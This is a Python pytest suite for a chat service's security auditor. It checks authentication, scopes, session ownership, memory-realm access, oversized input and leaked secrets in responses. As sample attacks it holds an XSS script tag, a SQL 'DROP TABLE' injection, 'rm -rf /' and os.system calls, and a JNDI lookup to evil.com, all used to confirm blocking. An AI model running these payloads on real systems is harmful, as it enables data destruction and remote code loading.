"""
Security tests for Chat with Memory v1.

KISS: Test authentication, authorization, input validation.
"""

from uuid import uuid4

import pytest

from src.chat.models import ChatRequestV1
from src.chat.security.security_audit_v1 import SecurityAuditor


class TestSecurityAudit:
    """Test security audit functionality."""
    
    @pytest.fixture
    def auditor(self):
        """Create security auditor."""
        return SecurityAuditor()
        
    @pytest.fixture
    def valid_user_context(self):
        """Create valid user context."""
        return {
            "user_id": str(uuid4()),
            "client_id": str(uuid4()),
            "scopes": ["sparkjar_internal"]
        }
        
    @pytest.fixture
    def valid_request(self):
        """Create valid chat request."""
        return ChatRequestV1(
            client_user_id=uuid4(),
            actor_type="synth",
            actor_id=uuid4(),
            message="How do I create a database?",
            mode="agent"
        )
        
    def test_valid_request_passes(self, auditor, valid_request, valid_user_context):
        """Test valid request passes audit."""
        is_safe, error = auditor.audit_request(valid_request, valid_user_context)
        
        assert is_safe is True
        assert error is None
        
    def test_missing_authentication_fails(self, auditor, valid_request):
        """Test missing authentication fails."""
        invalid_context = {"scopes": ["sparkjar_internal"]}  # Missing user_id
        
        is_safe, error = auditor.audit_request(valid_request, invalid_context)
        
        assert is_safe is False
        assert "Authentication required" in error
        
    def test_missing_scope_fails(self, auditor, valid_request):
        """Test missing required scope fails."""
        invalid_context = {
            "user_id": str(uuid4()),
            "client_id": str(uuid4()),
            "scopes": ["other_scope"]  # Wrong scope
        }
        
        is_safe, error = auditor.audit_request(valid_request, invalid_context)
        
        assert is_safe is False
        assert "Unauthorized" in error
        
    def test_script_injection_detected(self, auditor, valid_user_context):
        """Test script injection is detected."""
        malicious_request = ChatRequestV1(
            client_user_id=uuid4(),
            actor_type="synth",
            actor_id=uuid4(),
            message="Hello <script>alert('xss')</script>",
            mode="agent"
        )
        
        is_safe, error = auditor.audit_request(malicious_request, valid_user_context)
        
        assert is_safe is False
        assert "dangerous content" in error
        
    def test_sql_injection_detected(self, auditor, valid_user_context):
        """Test SQL injection is detected."""
        malicious_request = ChatRequestV1(
            client_user_id=uuid4(),
            actor_type="synth",
            actor_id=uuid4(),
            message="'; DROP TABLE users; --",
            mode="agent"
        )
        
        is_safe, error = auditor.audit_request(malicious_request, valid_user_context)
        
        assert is_safe is False
        assert "dangerous content" in error
        
    def test_oversized_request_rejected(self, auditor, valid_user_context):
        """Test oversized requests are rejected."""
        large_message = "x" * 11000  # Over 10KB limit
        
        large_request = ChatRequestV1(
            client_user_id=uuid4(),
            actor_type="synth",
            actor_id=uuid4(),
            message=large_message,
            mode="agent"
        )
        
        is_safe, error = auditor.audit_request(large_request, valid_user_context)
        
        assert is_safe is False
        assert "too large" in error
        
    def test_session_access_validation(self, auditor):
        """Test session access validation."""
        session_id = uuid4()
        owner_id = uuid4()
        other_user_id = uuid4()
        
        # Owner can access
        assert auditor.validate_session_access(session_id, owner_id, owner_id)
        
        # Other user cannot
        assert not auditor.validate_session_access(session_id, other_user_id, owner_id)
        
    def test_memory_realm_filtering(self, auditor, valid_user_context):
        """Test memory realm access filtering."""
        # User without client_admin scope
        requested_realms = {
            "include_own": True,
            "include_class": True,
            "include_skills": True,
            "include_client": True
        }
        
        allowed = auditor.validate_memory_realm_access(
            valid_user_context,
            requested_realms
        )
        
        # Should deny CLIENT realm
        assert allowed["include_client"] is False
        assert allowed["include_own"] is True
        
        # User with client_admin scope
        admin_context = valid_user_context.copy()
        admin_context["scopes"].append("client_admin")
        
        allowed = auditor.validate_memory_realm_access(
            admin_context,
            requested_realms
        )
        
        # Should allow CLIENT realm
        assert allowed["include_client"] is True
        
    def test_response_data_leakage(self, auditor, valid_user_context):
        """Test response data leakage detection."""
        # Response with sensitive data
        bad_response = {
            "session_id": str(uuid4()),
            "message_id": str(uuid4()),
            "response": "Your password is: secret123",
            "api_key": "sk-1234567890"  # Leaked API key
        }
        
        is_safe, error = auditor.audit_response(bad_response, valid_user_context)
        
        assert is_safe is False
        assert "sensitive data" in error
        
    def test_security_event_logging(self, auditor, valid_user_context):
        """Test security events are logged."""
        # Trigger some security events
        invalid_context = {"scopes": []}
        auditor.audit_request(
            ChatRequestV1(
                client_user_id=uuid4(),
                actor_type="synth",
                actor_id=uuid4(),
                message="test",
                mode="agent"
            ),
            invalid_context
        )
        
        # Check events were logged
        report = auditor.get_security_report()
        
        assert report["total_events"] > 0
        assert "auth_failure" in report["event_counts"]
        
    def test_code_execution_patterns(self, auditor, valid_user_context):
        """Test code execution patterns are caught."""
        dangerous_messages = [
            "Please eval(malicious_code)",
            "Run exec('rm -rf /')",
            "__import__('os').system('ls')",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for msg in dangerous_messages:
            request = ChatRequestV1(
                client_user_id=uuid4(),
                actor_type="synth",
                actor_id=uuid4(),
                message=msg,
                mode="agent"
            )
            
            is_safe, error = auditor.audit_request(request, valid_user_context)
            assert is_safe is False, f"Failed to catch: {msg}"